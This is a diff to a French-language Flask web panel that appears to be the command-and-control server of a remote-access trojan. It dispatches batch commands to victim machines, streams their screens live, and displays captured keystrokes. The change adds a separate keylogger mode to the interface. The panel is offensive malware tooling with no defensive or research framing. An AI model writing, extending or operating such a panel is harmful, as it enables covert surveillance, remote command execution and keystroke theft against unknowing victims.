@@ -10,7 +10,7 @@ app = Flask(__name__)
 commande = ""
 resultat_commande = ""
 destinataires = ""
-mode = "cmd"        # "cmd" ou "live"
+mode = "cmd"        # "cmd", "live" ou "keys"
 last_host = ""      # hostname du dernier screenshot reçu
 key_logs = ""       # journal des touches
 
@@ -20,25 +20,36 @@ html_page = """
 <html>
 <head>
   <meta charset="utf-8">
-  <title>Console & Live Screen & Keylogger</title>
+  <title>Console, Live Screen & Keylogger</title>
   <style>
     body { font-family: sans-serif; padding: 20px; }
     .section { margin-top: 30px; }
     #stream { max-width:90vw; border:1px solid #ccc; display:block; }
-    pre { background:#f5f5f5; padding:10px; }
+    pre { background:#f5f5f5; padding:10px; white-space: pre-wrap; }
+    button { margin-right: 10px; }
   </style>
 </head>
 <body>
   <h1>🖥️ Contrôle à Distance</h1>
 
-  <!-- Mode switch -->
+  <!-- Choix du mode -->
   <div class="section">
-    <button onclick="location.href='{{ url_for('set_mode') }}?mode=live'" {% if mode=='live' %}disabled{% endif %}>🔴 Live</button>
-    <button onclick="location.href='{{ url_for('set_mode') }}?mode=cmd'"  {% if mode=='cmd'  %}disabled{% endif %}>⚪ Commande</button>
+    <button onclick="location.href='{{ url_for('set_mode') }}?mode=cmd'"
+      {% if mode=='cmd' %}disabled{% endif %}>
+      ⚪ Commande
+    </button>
+    <button onclick="location.href='{{ url_for('set_mode') }}?mode=live'"
+      {% if mode=='live' %}disabled{% endif %}>
+      🔴 Live
+    </button>
+    <button onclick="location.href='{{ url_for('set_mode') }}?mode=keys'"
+      {% if mode=='keys' %}disabled{% endif %}>
+      🗝️ Keylogger
+    </button>
   </div>
 
   {% if mode == 'cmd' %}
-  <!-- Command console -->
+  <!-- SECTION COMMANDE -->
   <div class="section">
     <h2>Envoyer une commande batch</h2>
     <form action="/" method="POST">
@@ -52,18 +63,23 @@ html_page = """
     </form>
     <h3>Résultat de la commande :</h3>
     <pre>{{ resultat_commande or "(vide)" }}</pre>
-
-    <h3>Key Logs:</h3>
-    <pre>{{ key_logs or "(aucun)" }}</pre>
   </div>
   {% endif %}
 
   {% if mode == 'live' %}
-  <!-- Live screen -->
+  <!-- SECTION LIVE SCREEN -->
   <div class="section">
     <h2>Live Screen</h2>
     <p><strong>Hostname :</strong> {{ last_host or "(aucun)" }}</p>
     <img id="stream" src="/mjpeg" alt="Live screen">
+  </div>
+  {% endif %}
+
+  {% if mode == 'keys' %}
+  <!-- SECTION KEYLOGGER -->
+  <div class="section">
+    <h2>Keylogger</h2>
+    <pre>{{ key_logs or "(aucun)" }}</pre>
   </div>
   {% endif %}
 </body>
@@ -90,7 +106,7 @@ def index():
 def set_mode():
     global mode
     m = request.args.get("mode","")
-    if m in ("live","cmd"):
+    if m in ("cmd","live","keys"):
         mode = m
     return redirect(url_for("index"))
 
@@ -136,7 +152,6 @@ def post_screen():
     last_host = mid
     return "Screenshot reçu", 200
 
-# Keylogger endpoint
 @app.route("/post_keys", methods=["POST"])
 def post_keys():
     global key_logs
